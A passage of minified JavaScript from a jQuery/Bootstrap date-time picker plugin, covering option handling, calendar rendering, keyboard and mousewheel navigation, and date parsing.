this.startViewMode, this.viewSelect = this.minView, "viewSelect" in a ? this.viewSelect = a.viewSelect : "viewSelect" in this.element.data() && (this.viewSelect = this.element.data("view-select")), this.viewSelect = k.convertViewMode(this.viewSelect), this.forceParse = !0, "forceParse" in a ? this.forceParse = a.forceParse : "dateForceParse" in this.element.data() && (this.forceParse = this.element.data("date-force-parse")); for (var n, i = 3 === this.bootcssVer ? k.templateV3 : k.template; -1 !== i.indexOf("{iconType}");)i = i.replace("{iconType}", this.icontype); for (; -1 !== i.indexOf("{leftArrow}");)i = i.replace("{leftArrow}", this.icons.leftArrow); for (; -1 !== i.indexOf("{rightArrow}");)i = i.replace("{rightArrow}", this.icons.rightArrow); this.picker = G(i).appendTo(this.isInline ? this.element : this.container).on({ click: G.proxy(this.click, this), mousedown: G.proxy(this.mousedown, this) }), this.wheelViewModeNavigation && (G.fn.mousewheel ? this.picker.on({ mousewheel: G.proxy(this.mousewheel, this) }) : console.log("Mouse Wheel event is not supported. Please include the jQuery Mouse Wheel plugin before enabling this option")), this.isInline ? this.picker.addClass("datetimepicker-inline") : this.picker.addClass("datetimepicker-dropdown-" + this.pickerPosition + " dropdown-menu"), this.isRTL && (this.picker.addClass("datetimepicker-rtl"), n = 3 === this.bootcssVer ? ".prev span, .next span" : ".prev i, .next i", this.picker.find(n).toggleClass(this.icons.leftArrow + " " + this.icons.rightArrow)), G(document).on("mousedown touchend", this.clickedOutside), this.autoclose = !1, "autoclose" in a ? this.autoclose = a.autoclose : "dateAutoclose" in this.element.data() && (this.autoclose = this.element.data("date-autoclose")), this.keyboardNavigation = !0, "keyboardNavigation" in a ? this.keyboardNavigation = a.keyboardNavigation : "dateKeyboardNavigation" in this.element.data() && (this.keyboardNavigation = this.element.data("date-keyboard-navigation")), this.todayBtn = a.todayBtn || this.element.data("date-today-btn") || !1, this.clearBtn = a.clearBtn || this.element.data("date-clear-btn") || !1, this.todayHighlight = a.todayHighlight || this.element.data("date-today-highlight") || !1, void (this.weekStart = 0) !== a.weekStart ? this.weekStart = a.weekStart : void 0 !== this.element.data("date-weekstart") ? this.weekStart = this.element.data("date-weekstart") : void 0 !== S[this.language].weekStart && (this.weekStart = S[this.language].weekStart), this.weekStart = this.weekStart % 7, this.weekEnd = (this.weekStart + 6) % 7, this.onRenderDay = function (t) { var e = (a.onRenderDay || function () { return [] })(t); "string" == typeof e && (e = [e]); return ["day"].concat(e || []) }, this.onRenderHour = function (t) { var e = (a.onRenderHour || function () { return [] })(t); return "string" == typeof e && (e = [e]), ["hour"].concat(e || []) }, this.onRenderMinute = function (t) { var e = (a.onRenderMinute || function () { return [] })(t), n = ["minute"]; return "string" == typeof e && (e = [e]), t < this.startDate || t > this.endDate ? n.push("disabled") : Math.floor(this.date.getUTCMinutes() / this.minuteStep) === Math.floor(t.getUTCMinutes() / this.minuteStep) && n.push("active"), n.concat(e || []) }, this.onRenderYear = function (t) { var e = (a.onRenderYear || function () { return [] })(t), n = ["year"]; "string" == typeof e && (e = [e]), this.date.getUTCFullYear() === t.getUTCFullYear() && n.push("active"); var i = t.getUTCFullYear(), o = this.endDate.getUTCFullYear(); return (t < this.startDate || o < i) && n.push("disabled"), n.concat(e || []) }, this.onRenderMonth = function (t) { var e = (a.onRenderMonth || function () { return [] })(t); return "string" == typeof e && (e = [e]), ["month"].concat(e || []) }, this.startDate = new Date(-8639968443048e3), this.endDate = new Date(8639968443048e3), this.datesDisabled = [], this.daysOfWeekDisabled = [], this.setStartDate(a.startDate || this.element.data("date-startdate")), this.setEndDate(a.endDate || this.element.data("date-enddate")), this.setDatesDisabled(a.datesDisabled || this.element.data("date-dates-disabled")), this.setDaysOfWeekDisabled(a.daysOfWeekDisabled || this.element.data("date-days-of-week-disabled")), this.setMinutesDisabled(a.minutesDisabled || this.element.data("date-minute-disabled")), this.setHoursDisabled(a.hoursDisabled || this.element.data("date-hour-disabled")), this.fillDow(), this.fillMonths(), this.update(), this.showMode(), this.isInline && this.show() } m.prototype = { constructor: m, _events: [], _attachEvents: function () { this._detachEvents(), this.isInput ? this._events = [[this.element, { focus: G.proxy(this.show, this), keyup: G.proxy(this.update, this), keydown: G.proxy(this.keydown, this) }]] : this.component && this.hasInput ? (this._events = [[this.element.find("input"), { focus: G.proxy(this.show, this), keyup: G.proxy(this.update, this), keydown: G.proxy(this.keydown, this) }], [this.component, { click: G.proxy(this.show, this) }]], this.componentReset && this._events.push([this.componentReset, { click: G.proxy(this.reset, this) }])) : this.element.is("div") ? this.isInline = !0 : this._events = [[this.element, { click: G.proxy(this.show, this) }]]; for (var t, e, n = 0; n < this._events.length; n++)t = this._events[n][0], e = this._events[n][1], t.on(e) }, _detachEvents: function () { for (var t, e, n = 0; n < this._events.length; n++)t = this._events[n][0], e = this._events[n][1], t.off(e); this._events = [] }, show: function (t) { this.picker.show(), this.height = this.component ? this.component.outerHeight() : this.element.outerHeight(), this.forceParse && this.update(), this.place(), G(window).on("resize", G.proxy(this.place, this)), t && (t.stopPropagation(), t.preventDefault()), this.isVisible = !0, this.element.trigger({ type: "show", date: this.date }) }, hide: function () { this.isVisible && (this.isInline || (this.picker.hide(), G(window).off("resize", this.place), this.viewMode = this.startViewMode, this.showMode(), this.isInput || G(document).off("mousedown", this.hide), this.forceParse && (this.isInput && this.element.val() || this.hasInput && this.element.find("input").val()) && this.setValue(), this.isVisible = !1, this.element.trigger({ type: "hide", date: this.date }))) }, remove: function () { this._detachEvents(), G(document).off("mousedown", this.clickedOutside), this.picker.remove(), delete this.picker, delete this.element.data().datetimepicker }, getDate: function () { var t = this.getUTCDate(); return null === t ? null : new Date(t.getTime() + 6e4 * t.getTimezoneOffset()) }, getUTCDate: function () { return this.date }, getInitialDate: function () { return this.initialDate }, setInitialDate: function (t) { this.initialDate = t }, setDate: function (t) { this.setUTCDate(new Date(t.getTime() - 6e4 * t.getTimezoneOffset())) }, setUTCDate: function (t) { t >= this.startDate && t <= this.endDate ? (this.date = t, this.setValue(), this.viewDate = this.date, this.fill()) : this.element.trigger({ type: "outOfRange", date: t, startDate: this.startDate, endDate: this.endDate }) }, setFormat: function (t) { var e; this.format = k.parseFormat(t, this.formatType), this.isInput ? e = this.element : this.component && (e = this.element.find("input")), e && e.val() && this.setValue() }, setValue: function () { var t = this.getFormattedDate(); this.isInput ? this.element.val(t) : (this.component && this.element.find("input").val(t), this.element.data("date", t)), this.linkField && G("#" + this.linkField).val(this.getFormattedDate(this.linkFormat)) }, getFormattedDate: function (t) { return t = t || this.format, k.formatDate(this.date, t, this.language, this.formatType, this.timezone) }, setStartDate: function (t) { this.startDate = t || this.startDate, 8639968443048e3 !== this.startDate.valueOf() && (this.startDate = k.parseDate(this.startDate, this.format, this.language, this.formatType, this.timezone)), this.update(), this.updateNavArrows() }, setEndDate: function (t) { this.endDate = t || this.endDate, 8639968443048e3 !== this.endDate.valueOf() && (this.endDate = k.parseDate(this.endDate, this.format, this.language, this.formatType, this.timezone)), this.update(), this.updateNavArrows() }, setDatesDisabled: function (t) { this.datesDisabled = t || [], G.isArray(this.datesDisabled) || (this.datesDisabled = this.datesDisabled.split(/,\s*/)); var e = this; this.datesDisabled = G.map(this.datesDisabled, function (t) { return k.parseDate(t, e.format, e.language, e.formatType, e.timezone).toDateString() }), this.update(), this.updateNavArrows() }, setTitle: function (t, e) { return this.picker.find(t).find("th:eq(1)").text(!1 === this.title ? e : this.title) }, setDaysOfWeekDisabled: function (t) { this.daysOfWeekDisabled = t || [], G.isArray(this.daysOfWeekDisabled) || (this.daysOfWeekDisabled = this.daysOfWeekDisabled.split(/,\s*/)), this.daysOfWeekDisabled = G.map(this.daysOfWeekDisabled, function (t) { return parseInt(t, 10) }), this.update(), this.updateNavArrows() }, setMinutesDisabled: function (t) { this.minutesDisabled = t || [], G.isArray(this.minutesDisabled) || (this.minutesDisabled = this.minutesDisabled.split(/,\s*/)), this.minutesDisabled = G.map(this.minutesDisabled, function (t) { return parseInt(t, 10) }), this.update(), this.updateNavArrows() }, setHoursDisabled: function (t) { this.hoursDisabled = t || [], G.isArray(this.hoursDisabled) || (this.hoursDisabled = this.hoursDisabled.split(/,\s*/)), this.hoursDisabled = G.map(this.hoursDisabled, function (t) { return parseInt(t, 10) }), this.update(), this.updateNavArrows() }, place: function () { var e, t, n, i, o, a; this.isInline || (this.zIndex || (e = 0, G("div").each(function () { var t = parseInt(G(this).css("zIndex"), 10); e < t && (e = t) }), this.zIndex = e + 10), o = this.container instanceof G ? this.container.offset() : G(this.container).offset(), this.component ? (i = (t = this.component.offset()).left, "bottom-left" !== this.pickerPosition && "top-left" !== this.pickerPosition || (i += this.component.outerWidth() - this.picker.outerWidth())) : (i = (t = this.element.offset()).left, "bottom-left" !== this.pickerPosition && "top-left" !== this.pickerPosition || (i += this.element.outerWidth() - this.picker.outerWidth())), (a = document.body.clientWidth || window.innerWidth) < i + 220 && (i = a - 220), n = "top-left" === this.pickerPosition || "top-right" === this.pickerPosition ? t.top - this.picker.outerHeight() : t.top + this.height, n -= o.top, i -= o.left, this.picker.css({ top: n, left: i, zIndex: this.zIndex })) }, hour_minute: "^([0-9]|0[0-9]|1[0-9]|2[0-3]):[0-5][0-9]", update: function () { var t, e = !1; arguments && arguments.length && ("string" == typeof arguments[0] || arguments[0] instanceof Date) ? (t = arguments[0], e = !0) : "string" == typeof (t = (this.isInput ? this.element.val() : this.element.find("input").val()) || this.element.data("date") || this.initialDate) && (t = t.replace(/^\s+|\s+$/g, "")), t || (t = new Date, e = !1), "string" == typeof t && (new RegExp(this.hour_minute).test(t) || new RegExp(this.hour_minute + ":[0-5][0-9]").test(t)) && (t = this.getDate()), this.date = k.parseDate(t, this.format, this.language, this.formatType, this.timezone), e && this.setValue(), this.date < this.startDate ? this.viewDate = new Date(this.startDate) : this.date > this.endDate ? this.viewDate = new Date(this.endDate) : this.viewDate = new Date(this.date), this.fill() }, fillDow: function () { for (var t = this.weekStart, e = "<tr>"; t < this.weekStart + 7;)e += '<th class="dow">' + S[this.language].daysMin[t++ % 7] + "</th>"; e += "</tr>", this.picker.find(".datetimepicker-days thead").append(e) }, fillMonths: function () { for (var t = "", e = new Date(this.viewDate), n = 0; n < 12; n++) { e.setUTCMonth(n), t += '<span class="' + this.onRenderMonth(e).join(" ") + '">' + S[this.language].monthsShort[n] + "</span>" } this.picker.find(".datetimepicker-months td").html(t) }, fill: function () { if (this.date && this.viewDate) { var t, e = (b = new Date(this.viewDate)).getUTCFullYear(), n = b.getUTCMonth(), i = b.getUTCDate(), o = b.getUTCHours(), a = this.startDate.getUTCFullYear(), s = this.startDate.getUTCMonth(), r = this.endDate.getUTCFullYear(), g = this.endDate.getUTCMonth() + 1, l = new w(this.date.getUTCFullYear(), this.date.getUTCMonth(), this.date.getUTCDate()).valueOf(), c = new Date; this.setTitle(".datetimepicker-days", S[this.language].months[n] + " " + e), "time" === this.formatViewType ? (t = this.getFormattedDate(), this.setTitle(".datetimepicker-hours", t), this.setTitle(".datetimepicker-minutes", t)) : (this.setTitle(".datetimepicker-hours", i + " " + S[this.language].months[n] + " " + e), this.setTitle(".datetimepicker-minutes", i + " " + S[this.language].months[n] + " " + e)), this.picker.find("tfoot th.today").text(S[this.language].today || S.en.today).toggle(!1 !== this.todayBtn), this.picker.find("tfoot th.clear").text(S[this.language].clear || S.en.clear).toggle(!1 !== this.clearBtn), this.updateNavArrows(), this.fillMonths(); var I = w(e, n - 1, 28, 0, 0, 0, 0), u = k.getDaysInMonth(I.getUTCFullYear(), I.getUTCMonth()); I.setUTCDate(u), I.setUTCDate(u - (I.getUTCDay() - this.weekStart + 7) % 7); var h = new Date(I); h.setUTCDate(h.getUTCDate() + 42), h = h.valueOf(); for (var d, C = []; I.valueOf() < h;)I.getUTCDay() === this.weekStart && C.push("<tr>"), d = this.onRenderDay(I), I.getUTCFullYear() < e || I.getUTCFullYear() === e && I.getUTCMonth() < n ? d.push("old") : (I.getUTCFullYear() > e || I.getUTCFullYear() === e && I.getUTCMonth() > n) && d.push("new"), this.todayHighlight && I.getUTCFullYear() === c.getFullYear() && I.getUTCMonth() === c.getMonth() && I.getUTCDate() === c.getDate() && d.push("today"), I.valueOf() === l && d.push("active"), (I.valueOf() + 864e5 <= this.startDate || I.valueOf() > this.endDate || -1 !== G.inArray(I.getUTCDay(), this.daysOfWeekDisabled) || -1 !== G.inArray(I.toDateString(), this.datesDisabled)) && d.push("disabled"), C.push('<td class="' + d.join(" ") + '">' + I.getUTCDate() + "</td>"), I.getUTCDay() === this.weekEnd && C.push("</tr>"), I.setUTCDate(I.getUTCDate() + 1); this.picker.find(".datetimepicker-days tbody").empty().append(C.join("")), C = []; for (var A = "", p = "", m = "", f = this.hoursDisabled || [], b = new Date(this.viewDate), B = 0; B < 24; B++) { b.setUTCHours(B), d = this.onRenderHour(b), -1 !== f.indexOf(B) && d.push("disabled"); var y = w(e, n, i, B); y.valueOf() + 36e5 <= this.startDate || y.valueOf() > this.endDate ? d.push("disabled") : o === B && d.push("active"), this.showMeridian && 2 === S[this.language].meridiem.length ? ((p = B < 12 ? S[this.language].meridiem[0] : S[this.language].meridiem[1]) !== m && ("" !== m && C.push("</fieldset>"), C.push('<fieldset class="hour"><legend>' + p.toUpperCase() + "</legend>")), m = p, A = B % 12 ? B % 12 : 12, B < 12 ? d.push("hour_am") : d.push("hour_pm"), C.push('<span class="' + d.join(" ") + '">' + A + "</span>"), 23 === B && C.push("</fieldset>")) : (A = B + ":00", C.push('<span class="' + d.join(" ") + '">' + A + "</span>")) } this.picker.find(".datetimepicker-hours td").html(C.join("")), C = [], m = p = A = ""; var v = this.minutesDisabled || []; b = new Date(this.viewDate); for (B = 0; B < 60; B += this.minuteStep)-1 === v.indexOf(B) && (b.setUTCMinutes(B), b.setUTCSeconds(0), d = this.onRenderMinute(b), this.showMeridian && 2 === S[this.language].meridiem.length ? ((p = o < 12 ? S[this.language].meridiem[0] : S[this.language].meridiem[1]) !== m && ("" !== m && C.push("</fieldset>"), C.push('<fieldset class="minute"><legend>' + p.toUpperCase() + "</legend>")), m = p, A = o % 12 ? o % 12 : 12, C.push('<span class="' + d.join(" ") + '">' + A + ":" + (B < 10 ? "0" + B : B) + "</span>"), 59 === B && C.push("</fieldset>")) : (A = B + ":00", C.push('<span class="' + d.join(" ") + '">' + o + ":" + (B < 10 ? "0" + B : B) + "</span>"))); this.picker.find(".datetimepicker-minutes td").html(C.join("")); var x = this.date.getUTCFullYear(), F = this.setTitle(".datetimepicker-months", e).end().find(".month").removeClass("active"); x === e && F.eq(this.date.getUTCMonth()).addClass("active"), (e < a || r < e) && F.addClass("disabled"), e === a && F.slice(0, s).addClass("disabled"), e === r && F.slice(g).addClass("disabled"), C = "", e = 10 * parseInt(e / 10, 10); var Q = this.setTitle(".datetimepicker-years", e + "-" + (e + 9)).end().find("td"); --e, b = new Date(this.viewDate); for (B = -1; B < 11; B++)b.setUTCFullYear(e), d = this.onRenderYear(b), -1 !== B && 10 !== B || d.push(X), C += '<span class="' + d.join(" ") + '">' + e + "</span>", e += 1; Q.html(C), this.place() } }, updateNavArrows: function () { var t = new Date(this.viewDate), e = t.getUTCFullYear(), n = t.getUTCMonth(), i = t.getUTCDate(), o = t.getUTCHours(); switch (this.viewMode) { case 0: e <= this.startDate.getUTCFullYear() && n <= this.startDate.getUTCMonth() && i <= this.startDate.getUTCDate() && o <= this.startDate.getUTCHours() ? this.picker.find(".prev").css({ visibility: "hidden" }) : this.picker.find(".prev").css({ visibility: "visible" }), e >= this.endDate.getUTCFullYear() && n >= this.endDate.getUTCMonth() && i >= this.endDate.getUTCDate() && o >= this.endDate.getUTCHours() ? this.picker.find(".next").css({ visibility: "hidden" }) : this.picker.find(".next").css({ visibility: "visible" }); break; case 1: e <= this.startDate.getUTCFullYear() && n <= this.startDate.getUTCMonth() && i <= this.startDate.getUTCDate() ? this.picker.find(".prev").css({ visibility: "hidden" }) : this.picker.find(".prev").css({ visibility: "visible" }), e >= this.endDate.getUTCFullYear() && n >= this.endDate.getUTCMonth() && i >= this.endDate.getUTCDate() ? this.picker.find(".next").css({ visibility: "hidden" }) : this.picker.find(".next").css({ visibility: "visible" }); break; case 2: e <= this.startDate.getUTCFullYear() && n <= this.startDate.getUTCMonth() ? this.picker.find(".prev").css({ visibility: "hidden" }) : this.picker.find(".prev").css({ visibility: "visible" }), e >= this.endDate.getUTCFullYear() && n >= this.endDate.getUTCMonth() ? this.picker.find(".next").css({ visibility: "hidden" }) : this.picker.find(".next").css({ visibility: "visible" }); break; case 3: case 4: e <= this.startDate.getUTCFullYear() ? this.picker.find(".prev").css({ visibility: "hidden" }) : this.picker.find(".prev").css({ visibility: "visible" }), e >= this.endDate.getUTCFullYear() ? this.picker.find(".next").css({ visibility: "hidden" }) : this.picker.find(".next").css({ visibility: "visible" }) } }, mousewheel: function (t) { var e, n; t.preventDefault(), t.stopPropagation(), this.wheelPause || (this.wheelPause = !0, n = 0 < (e = t.originalEvent.wheelDelta) ? 1 : 0 === e ? 0 : -1, this.wheelViewModeNavigationInverseDirection && (n = -n), this.showMode(n), setTimeout(G.proxy(function () { this.wheelPause = !1 }, this), this.wheelViewModeNavigationDelay)) }, click: function (t) { t.stopPropagation(), t.preventDefault(); var e, n, i, o, a, s, r = G(t.target).closest("span, td, th, legend"); if (r.is("." + this.icontype) && (r = G(r).parent().closest("span, td, th, legend")), 1 === r.length) { if (r.is(".disabled")) return void this.element.trigger({ type: "outOfRange", date: this.viewDate, startDate: this.startDate, endDate: this.endDate }); switch (r[0].nodeName.toLowerCase()) { case "th": switch (r[0].className) { case "switch": this.showMode(1); break; case "prev": case "next": var g = k.modes[this.viewMode].navStep * ("prev" === r[0].className ? -1 : 1); switch (this.viewMode) { case 0: this.viewDate = this.moveHour(this.viewDate, g); break; case 1: this.viewDate = this.moveDate(this.viewDate, g); break; case 2: this.viewDate = this.moveMonth(this.viewDate, g); break; case 3: case 4: this.viewDate = this.moveYear(this.viewDate, g) }this.fill(), this.element.trigger({ type: r[0].className + ":" + this.convertViewModeText(this.viewMode), date: this.viewDate, startDate: this.startDate, endDate: this.endDate }); break; case "clear": this.reset(), this.autoclose && this.hide(); break; case "today": var l = new Date; (l = w(l.getFullYear(), l.getMonth(), l.getDate(), l.getHours(), l.getMinutes(), l.getSeconds(), 0)) < this.startDate ? l = this.startDate : l > this.endDate && (l = this.endDate), this.viewMode = this.startViewMode, this.showMode(0), this._setDate(l), this.fill(), this.autoclose && this.hide() }break; case "span": r.is(".disabled") || (n = this.viewDate.getUTCFullYear(), i = this.viewDate.getUTCMonth(), e = this.viewDate.getUTCDate(), o = this.viewDate.getUTCHours(), a = this.viewDate.getUTCMinutes(), s = this.viewDate.getUTCSeconds(), r.is(".month") ? (this.viewDate.setUTCDate(1), i = r.parent().find("span").index(r), e = this.viewDate.getUTCDate(), this.viewDate.setUTCMonth(i), this.element.trigger({ type: "changeMonth", date: this.viewDate }), 3 <= this.viewSelect && this._setDate(w(n, i, e, o, a, s, 0))) : r.is(".year") ? (this.viewDate.setUTCDate(1), n = parseInt(r.text(), 10) || 0, this.viewDate.setUTCFullYear(n), this.element.trigger({ type: "changeYear", date: this.viewDate }), 4 <= this.viewSelect && this._setDate(w(n, i, e, o, a, s, 0))) : r.is(".hour") ? (o = parseInt(r.text(), 10) || 0, (r.hasClass("hour_am") || r.hasClass("hour_pm")) && (12 === o && r.hasClass("hour_am") ? o = 0 : 12 !== o && r.hasClass("hour_pm") && (o += 12)), this.viewDate.setUTCHours(o), this.element.trigger({ type: "changeHour", date: this.viewDate }), 1 <= this.viewSelect && this._setDate(w(n, i, e, o, a, s, 0))) : r.is(".minute") && (a = parseInt(r.text().substr(r.text().indexOf(":") + 1), 10) || 0, this.viewDate.setUTCMinutes(a), this.element.trigger({ type: "changeMinute", date: this.viewDate }), 0 <= this.viewSelect && this._setDate(w(n, i, e, o, a, s, 0))), 0 !== this.viewMode ? (c = this.viewMode, this.showMode(-1), this.fill(), c === this.viewMode && this.autoclose && this.hide()) : (this.fill(), this.autoclose && this.hide())); break; case "td": r.is(".day") && !r.is(".disabled") && (e = parseInt(r.text(), 10) || 1, n = this.viewDate.getUTCFullYear(), i = this.viewDate.getUTCMonth(), o = this.viewDate.getUTCHours(), a = this.viewDate.getUTCMinutes(), s = this.viewDate.getUTCSeconds(), r.is(".old") ? 0 === i ? (i = 11, --n) : --i : r.is(".new") && (11 === i ? (i = 0, n += 1) : i += 1), this.viewDate.setUTCFullYear(n), this.viewDate.setUTCMonth(i, e), this.element.trigger({ type: "changeDay", date: this.viewDate }), 2 <= this.viewSelect && this._setDate(w(n, i, e, o, a, s, 0))); var c = this.viewMode; this.showMode(-1), this.fill(), c === this.viewMode && this.autoclose && this.hide() } } }, _setDate: function (t, e) { var n; e && "date" !== e || (this.date = t), e && "view" !== e || (this.viewDate = t), this.fill(), this.setValue(), this.isInput ? n = this.element : this.component && (n = this.element.find("input")), n && n.change(), this.element.trigger({ type: "changeDate", date: this.getDate() }), null === t && (this.date = this.viewDate) }, moveMinute: function (t, e) { if (!e) return t; var n = new Date(t.valueOf()); return n.setUTCMinutes(n.getUTCMinutes() + e * this.minuteStep), n }, moveHour: function (t, e) { if (!e) return t; var n = new Date(t.valueOf()); return n.setUTCHours(n.getUTCHours() + e), n }, moveDate: function (t, e) { if (!e) return t; var n = new Date(t.valueOf()); return n.setUTCDate(n.getUTCDate() + e), n }, moveMonth: function (t, e) { if (!e) return t; var n, i, o = new Date(t.valueOf()), a = o.getUTCDate(), s = o.getUTCMonth(), r = Math.abs(e); if (e = 0 < e ? 1 : -1, 1 === r) i = -1 === e ? function () { return o.getUTCMonth() === s } : function () { return o.getUTCMonth() !== n }, n = s + e, o.setUTCMonth(n), (n < 0 || 11 < n) && (n = (n + 12) % 12); else { for (var g = 0; g < r; g++)o = this.moveMonth(o, e); n = o.getUTCMonth(), o.setUTCDate(a), i = function () { return n !== o.getUTCMonth() } } for (; i();)o.setUTCDate(--a), o.setUTCMonth(n); return o }, moveYear: function (t, e) { return this.moveMonth(t, 12 * e) }, dateWithinRange: function (t) { return t >= this.startDate && t <= this.endDate }, keydown: function (t) { if (this.picker.is(":not(:visible)")) 27 === t.keyCode && this.show(); else { var e, n, i, o, a, s = !1; switch (t.keyCode) { case 27: this.hide(), t.preventDefault(); break; case 37: case 39: if (!this.keyboardNavigation) break; e = 37 === t.keyCode ? -1 : 1; var r = this.viewMode; t.ctrlKey ? r += 2 : t.shiftKey && (r += 1), 4 === r ? (n = this.moveYear(this.date, e), i = this.moveYear(this.viewDate, e)) : 3 === r ? (n = this.moveMonth(this.date, e), i = this.moveMonth(this.viewDate, e)) : 2 === r ? (n = this.moveDate(this.date, e), i = this.moveDate(this.viewDate, e)) : 1 === r ? (n = this.moveHour(this.date, e), i = this.moveHour(this.viewDate, e)) : 0 === r && (n = this.moveMinute(this.date, e), i = this.moveMinute(this.viewDate, e)), this.dateWithinRange(n) && (this.date = n, this.viewDate = i, this.setValue(), this.update(), t.preventDefault(), s = !0); break; case 38: case 40: if (!this.keyboardNavigation) break; e = 38 === t.keyCode ? -1 : 1, r = this.viewMode, t.ctrlKey ? r += 2 : t.shiftKey && (r += 1), 4 === r ? (n = this.moveYear(this.date, e), i = this.moveYear(this.viewDate, e)) : 3 === r ? (n = this.moveMonth(this.date, e), i = this.moveMonth(this.viewDate, e)) : 2 === r ? (n = this.moveDate(this.date, 7 * e), i = this.moveDate(this.viewDate, 7 * e)) : 1 === r ? i = this.showMeridian ? (n = this.moveHour(this.date, 6 * e), this.moveHour(this.viewDate, 6 * e)) : (n = this.moveHour(this.date, 4 * e), this.moveHour(this.viewDate, 4 * e)) : 0 === r && (n = this.moveMinute(this.date, 4 * e), i = this.moveMinute(this.viewDate, 4 * e)), this.dateWithinRange(n) && (this.date = n, this.viewDate = i, this.setValue(), this.update(), t.preventDefault(), s = !0); break; case 13: 0 !== this.viewMode ? (o = this.viewMode, this.showMode(-1), this.fill(), o === this.viewMode && this.autoclose && this.hide()) : (this.fill(), this.autoclose && this.hide()), t.preventDefault(); break; case 9: this.hide() }s && (this.isInput ? a = this.element : this.component && (a = this.element.find("input")), a && a.change(), this.element.trigger({ type: "changeDate", date: this.getDate() })) } }, showMode: function (t) { var e; !t || (e = Math.max(0, Math.min(k.modes.length - 1, this.viewMode + t))) >= this.minView && e <= this.maxView && (this.element.trigger({ type: "changeMode", date: this.viewDate, oldViewMode: this.viewMode, newViewMode: e }), this.viewMode = e), this.picker.find(">div").hide().filter(".datetimepicker-" + k.modes[this.viewMode].clsName).css("display", "block"), this.updateNavArrows() }, reset: function () { this._setDate(null, "date") }, convertViewModeText: function (t) { switch (t) { case 4: return "decade"; case 3: return "year"; case 2: return "month"; case 1: return "day"; case 0: return "hour" } } }; var X = G.fn.datetimepicker; G.fn.datetimepicker = function (i) { var o, a = Array.apply(null, arguments); return a.shift(), this.each(function () { var t = G(this), e = t.data("datetimepicker"), n = "object" == typeof i && i; if (e || t.data("datetimepicker", e = new m(this, G.extend({}, G.fn.datetimepicker.defaults, n))), "string" == typeof i && "function" == typeof e[i] && (o = e[i].apply(e, a)) !== s) return !1 }), o !== s ? o : this }, G.fn.datetimepicker.defaults = {}, G.fn.datetimepicker.Constructor = m; var S = G.fn.datetimepicker.dates = { en: { days: ["Sunday", "Monday", "Tuesday", "Wednesday", "Thursday", "Friday", "Saturday", "Sunday"], daysShort: ["Sun", "Mon", "Tue", "Wed", "Thu", "Fri", "Sat", "Sun"], daysMin: ["Su", "Mo", "Tu", "We", "Th", "Fr", "Sa", "Su"], months: ["January", "February", "March", "April", "May", "June", "July", "August", "September", "October", "November", "December"], monthsShort: ["Jan", "Feb", "Mar", "Apr", "May", "Jun", "Jul", "Aug", "Sep", "Oct", "Nov", "Dec"], meridiem: ["am", "pm"], suffix: ["st", "nd", "rd", "th"], today: "Today", clear: "Clear" } }, k = { modes: [{ clsName: "minutes", navFnc: "Hours", navStep: 1 }, { clsName: "hours", navFnc: "Date", navStep: 1 }, { clsName: "days", navFnc: "Month", navStep: 1 }, { clsName: "months", navFnc: "FullYear", navStep: 1 }, { clsName: "years", navFnc: "FullYear", navStep: 10 }], isLeapYear: function (t) { return t % 4 == 0 && t % 100 != 0 || t % 400 == 0 }, getDaysInMonth: function (t, e) { return [31, k.isLeapYear(t) ? 29 : 28, 31, 30, 31, 30, 31, 31, 30, 31, 30, 31][e] }, getDefaultFormat: function (t, e) { if ("standard" === t) return "input" === e ? "yyyy-mm-dd hh:ii" : "yyyy-mm-dd hh:ii:ss"; if ("php" === t) return "input" === e ? "Y-m-d H:i" : "Y-m-d H:i:s"; throw new Error("Invalid format type.") }, validParts: function (t) { if ("standard" === t) return /t|hh?|HH?|p|P|z|Z|ii?|ss?|dd?|DD?|mm?|MM?|yy(?:yy)?/g; if ("php" === t) return /[dDjlNwzFmMnStyYaABgGhHis]/g; throw new Error("Invalid format type.") }, nonpunctuation: /[^ -\/:-@\[-`{-~\t\n\rTZ]+/g, parseFormat: function (t, e) { var n = t.replace(this.validParts(e), "\0").split("\0"), i = t.match(this.validParts(e)); if (!n || !n.length || !i || 0 === i.length) throw new Error("Invalid date format."); return { separators: n, parts: i } }, parseDate: function (t, e, n, i, o) { if (t instanceof Date) { var a = new Date(t.valueOf() - 6e4 * t.getTimezoneOffset()); return a.setMilliseconds(0), a } if (/^\d{4}\-\d{1,2}\-\d{1,2}$/.test(t) && (e = this.parseFormat("yyyy-mm-dd", i)), /^\d{4}\-\d{1,2}\-\d{1,2}[T ]\d{1,2}\:\d{1,2}$/.test(t) && (e = this.parseFormat("yyyy-mm-dd hh:ii", i)), /^\d{4}\-\d{1,2}\-\d{1,2}[T ]\d{1,2}\:\d{1,2}\:\d{1,2}[Z]{0,1}$/.test(t) && (e = this.parseFormat("yyyy-mm-dd hh:ii:ss", i)), /^[-+]\d+[dmwy]([\s,]+[-+]\d+[dmwy])*$/.test(t)) { var s, r = /([-+]\d+)([dmwy])/, g = t.match(/([-+]\d+)([dmwy])/g); t = new Date; for (var l = 0; l < g.length; l++)switch (u = r.exec(g[l]), s = parseInt(u[1]), u[2]) { case "d": t.setUTCDate(t.getUTCDate() + s); break; case "m": t = m.prototype.moveMonth.call(m.prototype, t, s); break; case "w": t.setUTCDate(t.getUTCDate() + 7 * s); break; case "y": t = m.prototype.moveYear.call(m.prototype, t, s) }return w(t.getUTCFullYear(), t.getUTCMonth(), t.getUTCDate(), t.getUTCHours(), t.getUTCMinutes(), t.getUTCSeconds(), 0) } var c, I, u, g = t && t.toString().match(this.nonpunctuation) || [], t = new Date(0, 0, 0, 0, 0, 0, 0), h = {}, d = ["hh", "h", "ii", "i", "ss", "s", "yyyy", "yy", "M", "MM", "m", "mm", "D", "DD", "d", "dd", "H", "HH", "p", "P", "z", "Z"], C = { hh: function (t, e) { return t.setUTCHours(e) }, h: function (t, e) { return t.setUTCHours(e) }, HH: function (t, e) { return t.setUTCHours(12 === e ? 0 : e) }, H: function (t, e) { return t.setUTCHours(12 === e ? 0 : e) }, ii: function (t, e) { return t.setUTCMinutes(e) }, i: function (t, e) { return t.setUTCMinutes(e) }, ss: function (t, e) { return t.setUTCSeconds(e) }, s: function (t, e) { return t.setUTCSeconds(e) }, yyyy: function (t, e) { return t.setUTCFullYear(e) }, yy: function (t, e) { return t.setUTCFullYear(2e3 + e) }, m: function (t, e) { for (--e; e < 0;)e += 12; for (e %= 12, t.setUTCMonth(e); t.getUTCMonth() !== e;) { if (isNaN(t.getUTCMonth())) return t; t.setUTCDate(t.getUTCDate() - 1) } return t }, d: function (t, e) { return t.setUTCDate(e) }, p: function (t, e) { return t.setUTCHours(1 === e ? t.getUTCHours() + 12 : t.getUTCHours()) }, z: function () { return o } 